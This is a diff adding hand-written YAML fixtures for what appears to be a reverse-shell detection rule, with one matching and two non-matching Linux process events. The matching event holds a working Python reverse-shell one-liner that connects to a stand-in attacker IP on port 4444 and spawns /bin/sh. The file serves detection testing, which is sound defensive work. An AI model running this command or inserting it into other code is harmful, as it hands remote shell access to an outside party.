@@ -1,0 +1,12 @@
+# Hand-written fixtures (the converter does not generate them); values are invented.
+match:
+  - desc: "python pty + socket reverse shell"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24101, "ppid": 24090, "exe": "/usr/bin/python3.11", "name": "python3.11", "uid": -1, "euid": -1, "username": "www-data", "cmdline": "python3 -c import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.20\",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")", "parent": {"pid": 24090, "exe": "/usr/bin/bash", "name": "bash"}}}
+nomatch:
+  - desc: "benign lookalike - pty.spawn to upgrade a local shell (no socket)"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24110, "ppid": 24090, "exe": "/usr/bin/python3.11", "name": "python3.11", "uid": -1, "euid": -1, "username": "root", "cmdline": "python3 -c import pty; pty.spawn(\"/bin/bash\")", "parent": {"pid": 24090, "exe": "/usr/bin/bash", "name": "bash"}}}
+  - desc: "python runs a web app"
+    events:
+      - {"name": "CreateProcess", "platform": "linux", "proc": {"pid": 24111, "ppid": 24090, "exe": "/usr/bin/python3.11", "name": "python3.11", "uid": -1, "euid": -1, "username": "www-data", "cmdline": "python3 manage.py runserver 0.0.0.0:8000", "parent": {"pid": 24090, "exe": "/usr/bin/bash", "name": "bash"}}}
